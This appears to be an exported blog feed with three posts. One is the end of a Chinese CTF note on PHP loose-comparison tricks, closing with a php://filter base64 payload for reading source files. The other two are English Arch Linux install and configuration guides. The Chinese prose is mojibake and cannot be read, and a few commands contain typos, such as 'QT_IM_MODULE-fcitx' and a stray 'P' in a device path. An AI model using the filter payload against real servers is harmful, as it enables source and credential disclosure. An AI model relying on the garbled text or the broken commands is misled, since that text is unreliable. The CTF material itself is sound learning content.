<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>strcmp()å‡½æ•°åœ¨PHPå®˜æ–¹æ‰‹å†Œä¸­çš„æè¿°æ˜¯<code>int strcmp ( string $str1 , string $str2 )</code>,éœ€è¦ç»™strcmp()ä¼ é€’2ä¸ªstringç±»å‹çš„å‚æ•°ã€‚å¦‚æœstr1å°äºstr2,è¿”å›-1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1ã€‚strcmpå‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²çš„æœ¬è´¨æ˜¯å°†ä¸¤ä¸ªå˜é‡è½¬æ¢ä¸ºasciiï¼Œç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç„¶åæ ¹æ®è¿ç®—ç»“æœæ¥å†³å®šè¿”å›å€¼ã€‚<br>å¦‚æœä¼ å…¥ç»™å‡ºstrcmp()çš„å‚æ•°æ˜¯å…¶å®ƒç±»å‹ï¼Œå¯èƒ½äº§ç”Ÿå…¶å®ƒä¸å¸Œæœ›çš„ç»“æœã€‚å¦‚ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">var_dump(strcmp($<span class="built_in">array</span>,<span class="string">'123'</span>)); <span class="comment">//null,åœ¨æŸç§æ„ä¹‰ä¸Šnullä¹Ÿå°±æ˜¯ç›¸å½“äºfalseï¼Œã€‚</span></span><br></pre></td></tr></table></figure>

<h4 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h4><p>å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ã€‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i =<span class="string">"2abc"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™ç¨‹åºè¾“å‡ºçš„æ˜¯<code>i is less than 3 but not negative</code>ï¼Œæ˜¯ç”±äºswitch()å‡½æ•°å°†$iè¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œè½¬æ¢ç»“æœä¸º2ã€‚</p>
<h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><p>åœ¨PHPæ‰‹å†Œä¸­ï¼Œin_array()å‡½æ•°çš„è§£é‡Šæ˜¯<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,å¦‚æœstrictå‚æ•°æ²¡æœ‰æä¾›ï¼Œé‚£ä¹ˆin_arrayå°±ä¼šä½¿ç”¨æ¾æ•£æ¯”è¾ƒæ¥åˆ¤æ–­$needleæ˜¯å¦åœ¨$haystackä¸­ã€‚å½“strinceçš„å€¼ä¸ºtrueæ—¶ï¼Œneedlsçš„ç±»å‹å’Œhaystackä¸­çš„ç±»å‹ä¼šè¢«ä¸¥æ ¼æ¯”è¾ƒã€‚</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=<span class="literal">[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,'<span class="number">3</span>']</span>;</span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('<span class="params">abc</span>', $<span class="params">array</span>)</span>);  <span class="comment">//true</span></span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('1bc', $<span class="params">array</span>)</span>);	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>array_search()ä¸in_array()ä¹Ÿæœ‰ä¸€æ ·çš„é—®é¢˜ã€‚</p>
<h2 id="PHP-Filter-ç›¸å…³å§¿åŠ¿"><a href="#PHP-Filter-ç›¸å…³å§¿åŠ¿" class="headerlink" title="PHP Filter ç›¸å…³å§¿åŠ¿"></a>PHP Filter ç›¸å…³å§¿åŠ¿</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Re:0 Install Archlinux From Scratch</title>
    <url>/2020/10/17/Re-0-Install-Archlinux-From-Scratch/</url>
    <content><![CDATA[<p>å‰å‡ å¤©æ‰‹è´±æŠŠè‡ªå·±åŸæ¥çš„Manjaroç³»ç»Ÿæç‚¸äº†ï¼Œäºæ˜¯è¶è¿™ä¸ªæœºä¼šé‡è£…äº†è‡ªå·±ä¸€ç›´å¿ƒå¿ƒå¿µå¿µçš„Archï¼Œä¹Ÿç®—æ˜¯ä»é›¶å¼€å§‹çš„Archç”Ÿæ´»äº†å§ã€‚å› ä¸ºè¿™ç¯‡åšå®¢æ˜¯åœ¨è£…ç³»ç»Ÿçš„è¿‡ç¨‹ä¸­å†™çš„ï¼Œå½“æ—¶è¿˜æ²¡æœ‰é…ç½®ä¸­æ–‡çš„è¾“å…¥æ³•ï¼Œæ‰€ä»¥ç”¨äº†è‹±æ–‡æ¥å†™ã€‚è‹±æ–‡æ°´å¹³æœ‰é™è‚¯å®šä¼šå‡ºä¸€äº›é”™è¯¯ï¼Œè¿˜è¯·æµ·æ¶µã€‚<del>è‡ªå·±å†è£…çš„æ—¶å€™èƒ½çœ‹æ‡‚å°±è¡Œ</del></p>
<a id="more"></a>

<h2 id="Prepare-an-installation-medium"><a href="#Prepare-an-installation-medium" class="headerlink" title="Prepare an installation medium"></a>Prepare an installation medium</h2><p>I used rufus on Windows 10 to make my U-disk an installation medium. I chose dd mode of rufus. Make sure there is an empty partition on your disk.</p>
<p>I will go straight to the next step because this is easy.</p>
<h2 id="Pre-Installation"><a href="#Pre-Installation" class="headerlink" title="Pre-Installation"></a>Pre-Installation</h2><h3 id="Boot-the-live-environment"><a href="#Boot-the-live-environment" class="headerlink" title="Boot the live environment"></a>Boot the live environment</h3><p>Disable secure boot. Then restart your PC and boot from your USB device. Choose <code>Boot Arch Linux (x86_64)</code> , now you can see Archlinux is ready to load contents. Finally you will logged in on the first virtual console as the root user, and presented with a <code>zsh</code> shell prompt. You can autocomplete your commands using <code>tab</code> , OHHHHHH!</p>
<h3 id="Verify-the-boot-mode"><a href="#Verify-the-boot-mode" class="headerlink" title="Verify the boot mode"></a>Verify the boot mode</h3><p>To verify the boot mode, list the efivars directory:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>

<p>If the command shows the directory without error, then the system is booted in UEFI mode. If the directory does not exist, the system may be booted in BIOS (or CSM) mode. If the system did not boot in the mode you desired, refer to your motherboardâ€™s manual.</p>
<p>Or, a more secure way is <code>fdisk -l</code> ,if your SSD (or HDD) shows its <code>Disklabel type</code> is <code>gpt</code> and there is a small partition whose type is <code>EFI System</code> , Then your boot mode can be verified to be EFI.</p>
<h3 id="Connect-to-the-Internet"><a href="#Connect-to-the-Internet" class="headerlink" title="Connect to the Internet"></a>Connect to the Internet</h3><p>Arch needs network connection to complete its installation.</p>
<p>Ensure your network interface is listed and enabled:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip link</span><br></pre></td></tr></table></figure>

<p>For wired connection:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure>

<p>For wireless connection:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwctl</span><br><span class="line">device list</span><br><span class="line">station wlan0 scan</span><br><span class="line">station wlan0 get-networks</span><br><span class="line">station wlan0 connect `xxxxx`</span><br></pre></td></tr></table></figure>

<p>Check if you are connected to the internet:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure>

<p>If everything is OK, quit iwd:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<h3 id="Update-the-system-clock"><a href="#Update-the-system-clock" class="headerlink" title="Update the system clock"></a>Update the system clock</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>To check the service status, use <code>timedatectl status</code>.</p>
<h3 id="Partition-the-disks"><a href="#Partition-the-disks" class="headerlink" title="Partition the disks"></a>Partition the disks</h3><table>
<thead>
<tr>
<th>Device Type</th>
<th>File Name</th>
</tr>
</thead>
<tbody><tr>
<td>SATA/SAS/USB</td>
<td>/dev/sda,/dev/sdb,â€¦â€¦</td>
</tr>
<tr>
<td>IDE</td>
<td>/dev/hd0,/dev/hd1,â€¦â€¦</td>
</tr>
<tr>
<td>VIRTIO-BLOCK</td>
<td>/dev/vda,/dev/vdb,â€¦â€¦</td>
</tr>
<tr>
<td>M2(SSD)</td>
<td>/dev/nvme0,/dev/nvme1</td>
</tr>
<tr>
<td>SD/MMC/EMMC(Card)</td>
<td>/dev/mmcblk0,/dev/mmcblk1</td>
</tr>
<tr>
<td>CD drive</td>
<td>/dev/cdrom,/dev/sr0,/dev/sr1</td>
</tr>
</tbody></table>
<p>When recognized by the live system, disks are assigned to a <a href="https://wiki.archlinux.org/index.php/Block_device" target="_blank" rel="noopener">block device</a> such as <code>/dev/sda</code>, <code>/dev/nvme0n1</code> or <code>/dev/mmcblk0</code>. To identify these devices, use <code>lsblk</code> or <code>fdisk</code>.</p>
<p>I boot my Arch in UEFI mode, so first I must create a boot partition (EFI system partition). </p>
<h4 id="Create-a-boot-partition"><a href="#Create-a-boot-partition" class="headerlink" title="Create a boot partition"></a>Create a boot partition</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/&#123;YOUR DISK&#125;  <span class="comment"># Example: fdisk /dev/sdx  or  fdisk /dev/nvmex</span></span><br></pre></td></tr></table></figure>

<p>See usages of commands by typing <code>m</code> and enter.</p>
<p>Enter <code>n</code> to create a new partition. You are asked to select the starting sector, generally we type enter (select by default). Then enter end sector or partition size. I used <code>+512M</code> .</p>
<p>Enter <code>p</code> to check if it works. Enter <code>t</code> to change the type of your new partition. Enter <code>l</code> to see all types supported. Change it to EFI.</p>
<p>Enter <code>w</code> to save. You can check whether there is something wrong before that by <code>p</code>.</p>
<p>Format it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/&#123;YOUR BOOT PARTITION&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Root-partition"><a href="#Root-partition" class="headerlink" title="Root partition"></a>Root partition</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/&#123;YOUR DISK&#125;</span><br></pre></td></tr></table></figure>

<p>Create a new partition table if there is not one exist. I already have one on my disk so I go on directly.</p>
<p>Enter <code>n</code> to create a new partition. I want my new partition fill up the free space completely, so I use enter to choose the default.</p>
<p>Enter <code>p</code> then <code>w</code> just like creating your boot partition.</p>
<p>Format it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/P&#123;YOUR ROOT PARTITION&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Mount-the-file-systems"><a href="#Mount-the-file-systems" class="headerlink" title="Mount the file systems"></a>Mount the file systems</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/&#123;YOUR ROOT PARTITION&#125; /mnt</span><br><span class="line">mkdir /mnt/boot</span><br><span class="line">mount /dev/&#123;YOUR BOOT PARTITION&#125; /mnt/boot</span><br></pre></td></tr></table></figure>

<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Use-Pacman-Mirror"><a href="#Use-Pacman-Mirror" class="headerlink" title="Use Pacman Mirror"></a>Use Pacman Mirror</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p>Copy the mirrors you wants to use and paste them to the beginning of this file. One of the commonly used mirrors is <code>https://mirrors.tuna.tsinghua.edu.cn</code>.</p>
<p>I chose <code>https://linux.xidian.edu.cn/mirrors/archlinux/$repo/os/$arch</code> (Only available under the campus network environment).</p>
<h3 id="Install-essential-packages"><a href="#Install-essential-packages" class="headerlink" title="Install essential packages"></a>Install essential packages</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware dhcpcd</span><br></pre></td></tr></table></figure>

<h2 id="Configure-the-system"><a href="#Configure-the-system" class="headerlink" title="Configure the system"></a>Configure the system</h2><h3 id="Fstab"><a href="#Fstab" class="headerlink" title="Fstab"></a>Fstab</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<p>We need a check to make sure it is right since it is an important step. Check the resulting <code>/mnt/etc/fstab</code> file, and edit it in case of errors:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h3 id="Chroot"><a href="#Chroot" class="headerlink" title="Chroot"></a>Chroot</h3><p><code>chroot</code> means â€˜change rootâ€™. Change root into the new system:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>

<p>We can also use this command to fix our system if there is some problem with it.</p>
<h3 id="Time-zone"><a href="#Time-zone" class="headerlink" title="Time zone"></a>Time zone</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>

<h3 id="Install-necessary-packages"><a href="#Install-necessary-packages" class="headerlink" title="Install necessary packages"></a>Install necessary packages</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager netctl</span><br></pre></td></tr></table></figure>

<h3 id="Localization"><a href="#Localization" class="headerlink" title="Localization"></a>Localization</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>

<p>Uncomment <code>zh_CN.UTF-8 UTF-8</code> <code>zh_HK.UTF-8 UTF-8</code> <code>zh_TW.UTF-8 UTF-8</code> <code>en_US.UTF-8 UTF-8</code> .</p>
<p>Then <code>:wq</code> save and quit.</p>
<p>Generate the locales by running:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>

<p>Config locale file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.conf</span><br></pre></td></tr></table></figure>

<p>Add the following line to the first line of this file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure>

<p><code>:wq</code> . Fine.</p>
<h3 id="Network-configuration"><a href="#Network-configuration" class="headerlink" title="Network configuration"></a>Network configuration</h3><p>Create the hostname file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<p>Config your hosts:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Add the following contents to the end of this file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	myhostname.localdomain	myhostname</span><br></pre></td></tr></table></figure>

<h3 id="Set-root-password"><a href="#Set-root-password" class="headerlink" title="Set root password"></a>Set root password</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>

<h3 id="Install-Intel-ucode-if-you-have-a-Intel-CPU"><a href="#Install-Intel-ucode-if-you-have-a-Intel-CPU" class="headerlink" title="Install Intel-ucode (if you have a Intel CPU)"></a>Install Intel-ucode (if you have a Intel CPU)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode</span><br></pre></td></tr></table></figure>

<h3 id="Install-BootLoader"><a href="#Install-BootLoader" class="headerlink" title="Install BootLoader"></a>Install BootLoader</h3><p>Caution! This blog is only for EFI/GPT boot mode! If you are in BIOS/MBR mode, please see <code>Reference 2</code> at the end.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S os-prober ntfs-3g</span><br><span class="line">pacman -S grub efibootmgr</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>If there is multi systems on your device, it is recommended to check whether each systemâ€™s entry is well generated.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>Check if it is all right.</p>
<h3 id="Reboot-and-enjoy-archlinux"><a href="#Reboot-and-enjoy-archlinux" class="headerlink" title="Reboot and enjoy archlinux"></a>Reboot and enjoy archlinux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount /mnt/boot</span><br><span class="line">umount /mnt</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>Pull out your U-disk. Login as root, enter your password.</p>
<p>If you can see the command line, congratulations, you have installed Archlinux successfully! OHHHHHHH!</p>
<p>There is still many things to do after that, I will put some guide for them on my next blog.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><p><a href="https://wiki.archlinux.org/index.php/Installation_guide" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Installation_guide</a></p>
</li>
<li><p><a href="https://www.viseator.com/2017/05/17/arch_install/" target="_blank" rel="noopener">https://www.viseator.com/2017/05/17/arch_install/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>ç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Re:1 Config Archlinux From Scratch</title>
    <url>/2020/10/17/Re-1-Config-Archlinux-From-Scratch/</url>
    <content><![CDATA[<p>ä¸Šä¸€ç¯‡æ–‡ç« ä»‹ç»äº†Archlinuxçš„å®‰è£…æµç¨‹ã€‚ä½†æ˜¯ï¼Œç°åœ¨è¿ä¸ªå›¾å½¢ç•Œé¢ä¹Ÿæ²¡æœ‰ï¼Œä¸€å †æ•ˆç‡å¯¼å‘çš„åŒ…éƒ½æ²¡æœ‰è£…ä¸Šï¼Œè¿™è¿˜ç©ä¸ªğŸ”¨å•Šã€‚è¿™ç¯‡æ¥çœ‹çœ‹å¦‚ä½•æŠŠArché…ç½®æˆç”¨èµ·æ¥è¶…çˆ½çš„å·¥å…·ã€‚å› ä¸ºåˆ°è¿™é‡Œè¿˜æ²¡æœ‰è£…å¥½ä¸­æ–‡è¾“å…¥æ³•ï¼Œæ‰€ä»¥å’Œä¸Šä¸€ç¯‡ä¸€æ ·æ˜¯è‹±æ–‡çš„ã€‚è‹±è¯­æ°´å¹³ä¸é«˜ï¼Œæœ‰é”™è¯¯çš„è¯ï¼Œä¸‡åˆ†æŠ±æ­‰ã€‚<del>ä¸‹æ¬¡é‡è£…ç³»ç»Ÿè‡ªå·±èƒ½çœ‹æ‡‚å°±è¡Œ</del></p>
<a id="more"></a>

<h2 id="Create-a-new-user"><a href="#Create-a-new-user" class="headerlink" title="Create a new user"></a>Create a new user</h2><p>It is unsafe to use root for daily use. It is better to create a ordinary user.</p>
<p>Letâ€™s create a new user named muted.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel muted</span><br></pre></td></tr></table></figure>

<p><code>-m</code> stands for creating a new folder whose name is the same as your new user. You can use <code>~</code> to access it easily. <code>-G wheel</code> stands for adding the new user â€œmutedâ€ to a group named â€œwheelâ€.</p>
<p>Set a password for this user:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd muted</span><br></pre></td></tr></table></figure>

<h2 id="Config-sudo"><a href="#Config-sudo" class="headerlink" title="Config sudo"></a>Config sudo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /usr/bin/vim /usr/bin/vi</span><br><span class="line">visudo</span><br></pre></td></tr></table></figure>

<p>Uncomment <code># %wheel ALL=(ALL)ALL</code>, then reboot. This time your new user is able to use <code>sudo</code> command.</p>
<h2 id="Graphical-interface-installation"><a href="#Graphical-interface-installation" class="headerlink" title="Graphical interface installation"></a>Graphical interface installation</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd  <span class="comment"># Connet to the Internet</span></span><br><span class="line">sudo pacman -S xf86-video-intel  <span class="comment"># If your GPU is from Intel</span></span><br></pre></td></tr></table></figure>

<p>See also: <a href="https://wiki.archlinux.org/index.php/Xorg#Driver_installation" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Xorg#Driver_installation</a></p>
<p>Now install Xorg and some necessary packages:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S xorg xorg-server plasma dolphin kate kdialog konsole fsearch dragon ffmpegthumbs sddm sddm-kcm</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure>

<p><code>kde-meta-kdeadmin</code> <code>kde-meta-kdeutils</code> <code>kde-meta-kdegraphics</code> have been removed because of obsoleteness.</p>
<h2 id="Config-your-Internet"><a href="#Config-your-Internet" class="headerlink" title="Config your Internet"></a>Config your Internet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager  <span class="comment"># Draw attention on UPPER and lower case</span></span><br><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure>

<h2 id="Use-pacman-mirror"><a href="#Use-pacman-mirror" class="headerlink" title="Use pacman mirror"></a>Use pacman mirror</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p>Copy the mirrors you wants to use and paste them to the beginning of this file. One of the commonly used mirrors is <code>https://mirrors.tuna.tsinghua.edu.cn</code>.</p>
<p>I chose <code>https://linux.xidian.edu.cn/mirrors/archlinux/$repo/os/$arch</code> (Only available under the campus network environment).</p>
<h2 id="Use-archlinuxcn-repository"><a href="#Use-archlinuxcn-repository" class="headerlink" title="Use archlinuxcn repository"></a>Use archlinuxcn repository</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<p>At the end of file add:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p>If you are a â€˜Xidianerâ€™ too, you can also:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://linux.xidian.edu.cn/mirrors/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p>Then:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syy</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure>

<h2 id="Use-AUR-repository-with-yay"><a href="#Use-AUR-repository-with-yay" class="headerlink" title="Use AUR repository with yay"></a>Use AUR repository with yay</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay</span><br><span class="line">yay -Syu --devel --combinedupgrade --save</span><br></pre></td></tr></table></figure>

<p>Then change current <code>aururl</code> to <code>https://aur.tuna.tsinghua.edu.cn</code>.</p>
<h2 id="Use-fish-shell-as-your-default-shell"><a href="#Use-fish-shell-as-your-default-shell" class="headerlink" title="Use fish shell as  your default shell"></a>Use fish shell as  your default shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fish</span><br></pre></td></tr></table></figure>


<p>Set fish the default shell on Konsole: <code>Konsole -&gt; Settings -&gt; Edit Current Profile</code>, choose /bin/fish as default command, Then restart Konsole.</p>
<p>Use fish as default user shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chsh -s /usr/bin/fish root</span><br><span class="line">sudo chsh -s /usr/bin/fish [username]</span><br></pre></td></tr></table></figure>

<p>Set greeting words:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> fish_greeting <span class="string">'Your Greeting Words'</span></span><br></pre></td></tr></table></figure>

<p>Config fish shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fish_config</span><br></pre></td></tr></table></figure>

<p>I recommend to set some abbreviations, for example:</p>
<p><code>pc</code> is short for <code>proxychains</code></p>
<p><code>pmc</code> is short for <code>sudo vim /etc/pacman.d/mirrorlist</code></p>
<p><code>pmi</code> is short for <code>sudo pacman -S</code></p>
<p><code>pms</code> is short for <code>sudo pacman -Ss</code></p>
<p><code>pmu</code> is short for <code>sudo pacman -Syyu</code></p>
<h2 id="Change-hosts-Github"><a href="#Change-hosts-Github" class="headerlink" title="Change hosts (Github)"></a>Change hosts (Github)</h2><p>Seems not very useful for me butâ€¦ just record it here in case that some day I need it.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S dnsutils</span><br></pre></td></tr></table></figure>


<p>Use <code>dig</code> or <code>nslookup</code> command to build a hosts file yourself.</p>
<h2 id="Bypass-GFW"><a href="#Bypass-GFW" class="headerlink" title="Bypass GFW"></a>Bypass GFW</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S v2ray qv2ray proxychains-ng</span><br></pre></td></tr></table></figure>

<p>More? â€¦sorry but I wonâ€™t tell you moreğŸ¤ª</p>
<p><strong>Caution! : Set your system time correctly first, or you can never success.</strong></p>
<p>If you want some rules, look at here: <a href="https://github.com/Loyalsoldier/v2ray-rules-dat" target="_blank" rel="noopener">https://github.com/Loyalsoldier/v2ray-rules-dat</a>, just put geosite and geoip into <code>/usr/share/v2ray/</code>. Easy!</p>
<h2 id="Fonts-config"><a href="#Fonts-config" class="headerlink" title="Fonts config"></a>Fonts config</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji ttf-sarasa-gothic nerd-fonts-jetbrains-mono wqy-microhei wqy-zenhei</span><br></pre></td></tr></table></figure>


<p>Download the config file at <a href="https://bitbucket.org/szclsya/dotfiles/src/master/fontconfig/fonts.conf" target="_blank" rel="noopener">https://bitbucket.org/szclsya/dotfiles/src/master/fontconfig/fonts.conf</a>, put it into <code>~/.config/fontconfig/fonts.conf</code>, log out and log in, then it works.</p>
<h2 id="Install-Google-chrome"><a href="#Install-Google-chrome" class="headerlink" title="Install Google-chrome"></a>Install Google-chrome</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S google-chrome</span><br></pre></td></tr></table></figure>

<p>Caution: the bin file named <code>google-chrome-stable</code>, so if you want to start it use command line, use:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">google-chrome-stable</span><br></pre></td></tr></table></figure>

<h2 id="Chinese-input"><a href="#Chinese-input" class="headerlink" title="Chinese input"></a>Chinese input</h2><p>I chose Rime(fcitx5) as my Chinese input scheme instead of sogou pinyin because the latter has some strange conflict with Jetbrains IDEs. <del>ğŸ”ªğŸ”ªğŸ”ªFuck Sogou</del></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im fcitx5-configtool</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons fcitx5-gtk fcitx5-qt fcitx5-pinyin-zhwiki kcm-fcitx5</span><br><span class="line">sudo pacman -S fcitx5-rime</span><br></pre></td></tr></table></figure>

<p><code>fcitx-configtool -&gt; add rime</code></p>
<p>Now letâ€™s config it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile</span><br></pre></td></tr></table></figure>

<p>Then add:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE-fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">"@im=fcitx"</span></span><br><span class="line">fcitx5 &amp;</span><br></pre></td></tr></table></figure>

<p>Log out then Log in. It works. Butâ€¦ Itâ€™s not BEEEAAAUTIFUL enough! </p>
